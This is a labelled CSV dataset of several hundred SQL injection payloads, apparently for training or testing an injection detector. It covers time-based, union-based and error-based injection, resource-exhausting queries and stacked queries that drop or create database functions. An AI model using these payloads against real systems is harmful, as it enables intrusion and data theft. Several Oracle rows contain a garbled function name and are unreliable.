payload;attack_type;label
1))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--;SQL injection;malicious
1')) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('gyre'='gyre;SQL injection;malicious
-8472') where 3340=3340 or make_set(1752=9905,9905)--;SQL injection;malicious
1')) as lmsl where 3753=3753 or elt(5873=5873,sleep(5))#;SQL injection;malicious
1))) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--;SQL injection;malicious
1') and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))));SQL injection;malicious
-2679'))) or 4747=dbms_utility.SQL injectiond_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('cutk' like 'cutk;SQL injection;malicious
1)) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--;SQL injection;malicious
1'||(select 'jmhb' where 1794=1794 or 4240=(select 4240 from pg_sleep(5))--;SQL injection;malicious
"1));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#";SQL injection;malicious
"1' in boolean mode);call regexp_substring(repeat(right(char(3702),0),500000000),null)#";SQL injection;malicious
"1';call regexp_substring(repeat(right(char(3702),0),500000000),null) and 'pczr'='pczr";SQL injection;malicious
-4797' union all select 8223,8223,8223,8223,8223,8223,8223,8223#;SQL injection;malicious
"-8709"" or 8571=8571--";SQL injection;malicious
"1%""))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""%""=""";SQL injection;malicious
"1"") and (select * from (select(sleep(5)))fzno) and (""zvew"" like ""zvew";SQL injection;malicious
"1);(select * from (select(sleep(5)))srmq) and (9069=9069";SQL injection;malicious
"1)) as prxq where 4600=4600;(select * from (select(sleep(5)))acdk)#";SQL injection;malicious
-3596))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (((3645=3645;SQL injection;malicious
"1)) as eigk where 2557=2557;select count(*) from generate_series(1,5000000)--";SQL injection;malicious
"1') where 8163=8163;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--";SQL injection;malicious
"-2899"")) as uyoc where 8417=8417 union all select 8417,8417,8417,8417--";SQL injection;malicious
1%') and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--;SQL injection;malicious
-5569') as cjaf where 3753=3753 union all select 3753#;SQL injection;malicious
1'+(select inrv where 2178=2178 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--;SQL injection;malicious
"1);if(4735=8907) select 4735 else drop function qigo--";SQL injection;malicious
1') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('cqrp'='cqrp;SQL injection;malicious
"1"") or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (""xmrq""=""xmrq";SQL injection;malicious
1') as noqp where 4042=4042 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--;SQL injection;malicious
-7505')) as lqvw where 8565=8565 or 6872=6872--;SQL injection;malicious
"1"") where 2180=2180 and make_set(8403=8403,8899)--";SQL injection;malicious
"1') as fkpn where 1100=1100;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--";SQL injection;malicious
1') and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--;SQL injection;malicious
1%'))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((('%'=';SQL injection;malicious
1') as pogx where 4105=4105 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--;SQL injection;malicious
"-7041""))) union all select 2159,2159,2159,2159,2159--";SQL injection;malicious
"1"") union all select null,null,null#";SQL injection;malicious
"-5115"" union all select 1642,1642,1642,1642,1642,1642,1642,1642--";SQL injection;malicious
"-7306"" or 2081=6847";SQL injection;malicious
"1%';select (case when (7271=1658) then 7271 else 7271*(select 7271 from information_schema.character_sets) end)#";SQL injection;malicious
"1"") where 6956=6956 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--";SQL injection;malicious
-9770')) as ovhh where 7903=7903 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--;SQL injection;malicious
"1));begin dbms_lock.sleep(5); end and ((2160=2160";SQL injection;malicious
"1"")) and elt(4249=4249,7259) and ((""xjdh""=""xjdh";SQL injection;malicious
"1%"") union all select null,null,null,null#";SQL injection;malicious
-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--;SQL injection;malicious
"1%')));if(7899=7899) select 7899 else drop function zbbp--";SQL injection;malicious
1') and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('ndhn' like 'ndhn;SQL injection;malicious
-8504 where 3086=3086 or 1131=9188#;SQL injection;malicious
"1;select case when 7717=7717 then 1 else null end--";SQL injection;malicious
"1%"" or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ""%""=""";SQL injection;malicious
"-4641"") where 4212=4212 or make_set(3595=4062,4062)--";SQL injection;malicious
"1'||(select 'adoe' from dual where 7662=7662;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)||'";SQL injection;malicious
1'))) and (select * from (select(sleep(5)))fzno) and ((('acml' like 'acml;SQL injection;malicious
1' or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and 'nhmz' like 'nhmz;SQL injection;malicious
"-7234"") union all select 3154,3154,3154,3154#";SQL injection;malicious
-6200%')) or 8077=4661;SQL injection;malicious
1') waitfor delay '0:0:5';SQL injection;malicious
1%') and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('%'=';SQL injection;malicious
"1"" where 3368=3368 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--";SQL injection;malicious
1)) as rcon where 8190=8190 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--;SQL injection;malicious
1') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3);SQL injection;malicious
-6200')) as jjpz where 4490=4490 union all select 4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--;SQL injection;malicious
1))) or (select * from (select(sleep(5)))ydpu) and (((3332=3332;SQL injection;malicious
1%' and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and '%'=';SQL injection;malicious
1 where 5925=5925 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--;SQL injection;malicious
1' where 8969=8969 union all select null,null,null,null,null--;SQL injection;malicious
1'||(select 'vwop' where 8536=8536 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--;SQL injection;malicious
-2214') union all select 8228#;SQL injection;malicious
"1"";call regexp_substring(repeat(right(char(3702),0),500000000),null)";SQL injection;malicious
"1"");create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (""tlbp""=""tlbp";SQL injection;malicious
1' or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and 'ibdj'='ibdj;SQL injection;malicious
1) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (7338=7338;SQL injection;malicious
"1"") as vpna where 5450=5450 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--";SQL injection;malicious
"1')) as kgfp where 2366=2366;select count(*) from generate_series(1,5000000)--";SQL injection;malicious
"1'));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#";SQL injection;malicious
1) or sleep(5)#;SQL injection;malicious
"1%')));(select * from (select(sleep(5)))srmq) and ((('%'='";SQL injection;malicious
"1'));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--";SQL injection;malicious
"1%"" or sleep(5) and ""%""=""";SQL injection;malicious
"1%"" or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--";SQL injection;malicious
"-3747"") union all select 8962,8962,8962,8962,8962#";SQL injection;malicious
"1"" where 4161=4161 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--";SQL injection;malicious
"1%"" or 4240=(select 4240 from pg_sleep(5))--";SQL injection;malicious
1'))) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--;SQL injection;malicious
"1%"")));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--";SQL injection;malicious
1') as ywtu where 3009=3009 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--;SQL injection;malicious
"-4044%"" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""%""=""";SQL injection;malicious
1') or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ('ywxc'='ywxc;SQL injection;malicious
"1"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--";SQL injection;malicious
"1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--";SQL injection;malicious
1'))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('xpks' like 'xpks;SQL injection;malicious
-3966') or 7338=8657;SQL injection;malicious
"1"" and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""vziz""=""vziz";SQL injection;malicious
-8248 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq');SQL injection;malicious
"1"") as pgza where 8756=8756 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--";SQL injection;malicious
1)) as gobw where 3496=3496 union all select null,null,null,null,null,null,null,null,null--;SQL injection;malicious
"-5560"")) or 7292=6184#";SQL injection;malicious
1) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (4976=4976;SQL injection;malicious
"1""))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((""ldlp""=""ldlp";SQL injection;malicious
1)) or sleep(5) and ((8285=8285;SQL injection;malicious
"1"")) as gqxk where 9199=9199 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--";SQL injection;malicious
"1') as xbsc where 6772=6772;waitfor delay '0:0:5'--";SQL injection;malicious
1' and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'cgbf' like 'cgbf;SQL injection;malicious
"1"")));select case when 6229=2077 then 1 else null end--";SQL injection;malicious
"1"" where 7599=7599;begin user_lock.sleep(5); end--";SQL injection;malicious
1%'))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((('%'=';SQL injection;malicious
"1%"") or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (""%""=""";SQL injection;malicious
"-5313""))) union all select 9189,9189,9189,9189,9189,9189,9189,9189--";SQL injection;malicious
1' or 6793=(select 6793 from pg_sleep(5));SQL injection;malicious
"1;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#";SQL injection;malicious
"1""))) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--";SQL injection;malicious
"1"")) or sleep(5) and ((""mcyv""=""mcyv";SQL injection;malicious
"1%"")) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""%""=""";SQL injection;malicious
"1');(select * from (select(sleep(5)))srmq) and ('pags'='pags";SQL injection;malicious
"1"") where 9621=9621;waitfor delay '0:0:5'--";SQL injection;malicious
"1""))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""fogb"" like ""fogb";SQL injection;malicious
1) where 9649=9649 and 8594=(select 8594 from pg_sleep(5))--;SQL injection;malicious
"1%"" and (3020=3020)*6703 and ""%""=""";SQL injection;malicious
"1%"")) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""%""=""";SQL injection;malicious
-2305' in boolean mode) union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--;SQL injection;malicious
"1%""))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""%""=""";SQL injection;malicious
-9145') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ('yvfl' like 'yvfl;SQL injection;malicious
-4721') or elt(4378=5165,5165) and ('fufn'='fufn;SQL injection;malicious
-6203'))) or 4747=dbms_utility.SQL injectiond_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('luee'='luee;SQL injection;malicious
"1%');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('%'='";SQL injection;malicious
1'))) and (8982=8027)*8027 and ((('qkrv'='qkrv;SQL injection;malicious
1%') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('%'=';SQL injection;malicious
"-4606"") as elek where 8261=8261 or 8571=8571--";SQL injection;malicious
1',(select (case when (3902=3902) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else 1/(select 0 from dual) end) from dual);SQL injection;malicious
1%' union all select null,null,null,null,null,null,null,null#;SQL injection;malicious
"-5204"") union all select 7186,7186,7186--";SQL injection;malicious
"1"" where 8379=8379 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--";SQL injection;malicious
"1%"")));(select * from (select(sleep(5)))srmq) and (((""%""=""";SQL injection;malicious
1%')) union all select null,null--;SQL injection;malicious
1 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)-- loao;SQL injection;malicious
"1' in boolean mode);select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--";SQL injection;malicious
"1));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--";SQL injection;malicious
-5672')) union all select 9371,9371,9371,9371,9371,9371--;SQL injection;malicious
"1')));select benchmark(5000000,md5(0x714e4153))#";SQL injection;malicious
"-7119"") or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (""rmzm""=""rmzm";SQL injection;malicious
"1"" and 7756=dbms_utility.SQL injectiond_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))";SQL injection;malicious
1%') or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('%'=';SQL injection;malicious
"1) as wiyx where 6515=6515;select case when 7717=7717 then 1 else null end--";SQL injection;malicious
1') as bdei where 9531=9531 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--;SQL injection;malicious
1%') and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ('%'=';SQL injection;malicious
"1%"");if(9953=4347) select 9953 else drop function ocau--";SQL injection;malicious
-4965) as imga where 3705=3705 union all select 3705--;SQL injection;malicious
1'+(select aahc where 5436=5436 and 3824=benchmark(5000000,md5(0x76555642)))+';SQL injection;malicious
-8309'||(select 'qecl' where 8449=8449 union all select 8449,8449,8449,8449,8449,8449,8449--;SQL injection;malicious
(case when 2646=8520 then 2646 else null end);SQL injection;malicious
"1"") waitfor delay '0:0:5' and (""hhzy"" like ""hhzy";SQL injection;malicious
"1"")) as uxnc where 8041=8041 and 9198=9198--";SQL injection;malicious
1') or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ('wdru' like 'wdru;SQL injection;malicious
1'))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('iuki'='iuki;SQL injection;malicious
-4807' where 3232=3232 or make_set(6599=5179,5179)--;SQL injection;malicious
"1%'));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--";SQL injection;malicious
"1""))) and make_set(8403=8403,8899) and (((""uisi""=""uisi";SQL injection;malicious
1)) as xutu where 5811=5811 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--;SQL injection;malicious
(select (case when (3348=1710) then 3348 else cast(1 as int)/(select 0 from dual) end) from dual);SQL injection;malicious
"1"") as upyn where 6185=6185 union all select null,null,null,null,null,null,null,null,null,null--";SQL injection;malicious
"1"") as kbjt where 2012=2012 and (5978=6898)*6898--";SQL injection;malicious
1')) as fwhv where 3921=3921 union all select null,null--;SQL injection;malicious
"-7422"" union all select 9127,9127,9127,9127,9127,9127,9127,9127,9127,9127#";SQL injection;malicious
"-5148"")) or 5310=8229";SQL injection;malicious
1)) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--;SQL injection;malicious
"1%"" and make_set(8403=8403,8899) and ""%""=""";SQL injection;malicious
1' in boolean mode) rlike sleep(5)#;SQL injection;malicious
1) as fxfe where 1148=1148 or (select * from (select(sleep(5)))sddo)#;SQL injection;malicious
"1%')));iif(4638=8258,1,1/0)";SQL injection;malicious
1') as ohcs where 9588=9588 or elt(6272=6272,sleep(5))--;SQL injection;malicious
-7903 where 6699=6699 or 8571=8571--;SQL injection;malicious
"1"" and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')";SQL injection;malicious
1'||(select 'fcws' from dual where 9184=9184 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161))||';SQL injection;malicious
"-1710"")) as cvky where 1858=1858 union all select 1858,1858--";SQL injection;malicious
-2174')) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (('dyyg'='dyyg;SQL injection;malicious
1'||(select 'xmoq' from dual where 8047=8047 and 7533=7533)||';SQL injection;malicious
1%' and 6454=8348 and '%'=';SQL injection;malicious
1%')) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('%'=';SQL injection;malicious
"1"" and 4595=4595#";SQL injection;malicious
"1"")) union all select null#";SQL injection;malicious
"-7553%"" or 3571=2886";SQL injection;malicious
1') or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x));SQL injection;malicious
1) and 8407=(select count(*) from generate_series(1,5000000)) and (2160=2160;SQL injection;malicious
"1%"")) rlike (select (case when (4207=1757) then 1 else 0x28 end)) and ((""%""=""";SQL injection;malicious
1')) as uncy where 8009=8009 union all select null,null,null,null,null,null,null,null,null#;SQL injection;malicious
"1';select * from generate_series(4465,4465,case when (4465=6232) then 1 else 0 end) limit 1--";SQL injection;malicious
-4325 order by 1--;SQL injection;malicious
1') rlike sleep(5) and ('boto'='boto;SQL injection;malicious
"1"")) as phis where 4420=4420 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--";SQL injection;malicious
"1') where 7541=7541;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--";SQL injection;malicious
"1);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--";SQL injection;malicious
1') as fxuk where 6184=6184 and make_set(9292=2785,2785)--;SQL injection;malicious
"-6076"")) or 8277=4757";SQL injection;malicious
"1;begin user_lock.sleep(5); end";SQL injection;malicious
"1 where 6500=6500;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--";SQL injection;malicious
"1%"" or 8466=benchmark(5000000,md5(0x694a4745)) and ""%""=""";SQL injection;malicious
"1%"")))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (((""%""=""";SQL injection;malicious
"-8661"" union all select 5731,5731--";SQL injection;malicious
"1%""));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""%""=""";SQL injection;malicious
1'+(select hsef where 4136=4136 or 8421=(select count(*) from generate_series(1,5000000)))+';SQL injection;malicious
1 rlike sleep(5);SQL injection;malicious
1) where 6784=6784 and elt(3114=3114,sleep(5))#;SQL injection;malicious
"1"" and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ""kfps""=""kfps";SQL injection;malicious
"1"") where 1614=1614 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--";SQL injection;malicious
"1"" where 3018=3018 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--";SQL injection;malicious
"1"") as wsyv where 8142=8142 rlike sleep(5)#";SQL injection;malicious
-7379 union all select 9813,9813,9813,9813,9813,9813,9813,9813--;SQL injection;malicious
1)) rlike sleep(5) and ((8773=8773;SQL injection;malicious
"1"" where 9889=9889;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--";SQL injection;malicious
"1)) as rbcf where 1053=1053;select (case when (3325=1767) then 3325 else 3325*(select 3325 from mysql.db) end)#";SQL injection;malicious
"1');begin user_lock.sleep(5); end and ('rlux' like 'rlux";SQL injection;malicious
-6586')) or 2021=2996;SQL injection;malicious
"1"";select pg_sleep(5)--";SQL injection;malicious
1')) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (('trzi'='trzi;SQL injection;malicious
"-6263%"")) or 4747=dbms_utility.SQL injectiond_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""%""=""";SQL injection;malicious
"1%"")));call regexp_substring(repeat(right(char(2385),0),500000000),null)--";SQL injection;malicious
1))) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--;SQL injection;malicious
"1') where 5616=5616;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--";SQL injection;malicious
1) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--;SQL injection;malicious
1' where 7445=7445 union all select null,null,null,null,null,null--;SQL injection;malicious
1') where 4786=4786 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--;SQL injection;malicious
1') where 4407=4407 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--;SQL injection;malicious
1') and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ('sqni' like 'sqni;SQL injection;malicious
1')) as orvy where 7270=7270 union all select null,null,null,null,null,null,null,null#;SQL injection;malicious
1') where 1645=1645 rlike sleep(5)--;SQL injection;malicious
1'||(select 'fbtm' where 1335=1335 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)))||';SQL injection;malicious
(select * from (select(sleep(5)))lrov);SQL injection;malicious
"1')));select sleep(5) and ((('qjsc'='qjsc";SQL injection;malicious
1) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4);SQL injection;malicious
"1"";select sleep(5) and ""jvys"" like ""jvys";SQL injection;malicious
1'+(select bldn where 8321=8321 and 8635=(select count(*) from generate_series(1,5000000))--;SQL injection;malicious
"1)));select (case when (8331=5625) then 8331 else 8331*(select 8331 from mysql.db) end)#";SQL injection;malicious
-1244) as qszw where 2332=2332 union all select 2332,2332,2332,2332#;SQL injection;malicious
"-6389"" union all select 2355,2355,2355,2355,2355--";SQL injection;malicious
1'))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((('jhle' like 'jhle;SQL injection;malicious
1'||(select 'nzjz' where 3539=3539 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--;SQL injection;malicious
"1%"") rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (""%""=""";SQL injection;malicious
"1' in boolean mode);call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)#";SQL injection;malicious
1')) as hbdi where 6758=6758 and elt(1210=1210,sleep(5))--;SQL injection;malicious
"1%"")) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((""%""=""";SQL injection;malicious
"1"" where 7879=7879;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--";SQL injection;malicious
-6581'||(select 'hpjd' where 7608=7608 union all select 7608,7608,7608,7608,7608,7608,7608,7608#;SQL injection;malicious
-9582') where 4397=4397 union all select 4397,4397,4397#;SQL injection;malicious
"1';select count(*) from generate_series(1,5000000)";SQL injection;malicious
"1"")) and elt(3785=9386,9386) and ((""inwa"" like ""inwa";SQL injection;malicious
1'||(select 'ocmk' from dual where 3961=3961 or 6793=(select 6793 from pg_sleep(5)))||';SQL injection;malicious
-4960 union all select 4031,4031#;SQL injection;malicious
